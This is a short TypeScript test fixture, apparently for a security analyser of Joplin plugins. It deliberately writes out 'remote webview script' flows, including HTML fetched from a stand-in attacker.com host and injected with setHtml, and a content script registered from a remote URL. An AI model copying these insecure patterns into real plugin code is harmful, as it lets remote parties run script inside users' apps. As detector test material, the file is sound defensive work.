// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    // Rule 11 : Remote Webview Scripts (Taint + Structural)
    const r11panel = await joplin.views.panels.create('panel_r11');

    // Flow 1: fetch -> setHtml
    const r11f1 = await fetch('http://attacker.com/ui');
    await joplin.views.panels.setHtml(r11panel, await r11f1.text());

    // Flow 2: process.env -> setHtml
    await joplin.views.panels.setHtml(r11panel, process.env.UI_URL);

    // Flow 3: Hardcoded external URL -> setHtml
    await joplin.views.panels.setHtml(r11panel, `<iframe src="https://example.com/remote"></iframe>`);

    // Flow 4: Same sources -> contentScripts.register
    await joplin.contentScripts.register('script1', 'test', 'https://example.com/script.js');
}

export {};
